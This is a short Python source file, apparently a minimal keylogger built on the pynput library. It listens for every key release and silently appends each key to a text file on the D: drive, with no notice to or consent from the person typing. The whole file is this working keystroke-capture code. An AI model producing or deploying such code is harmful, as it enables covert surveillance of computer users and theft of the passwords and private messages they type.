from pynput.keyboard import Key,Listener

def on_press(key):
    pass

def on_release(key):
    flag = str(key).replace("'","  ")
#    print(flag)
    with open('D:\\key.txt','a') as f:
        f.write(flag)

with Listener(on_press=on_press,on_release=on_release) as Listener:
    Listener.join()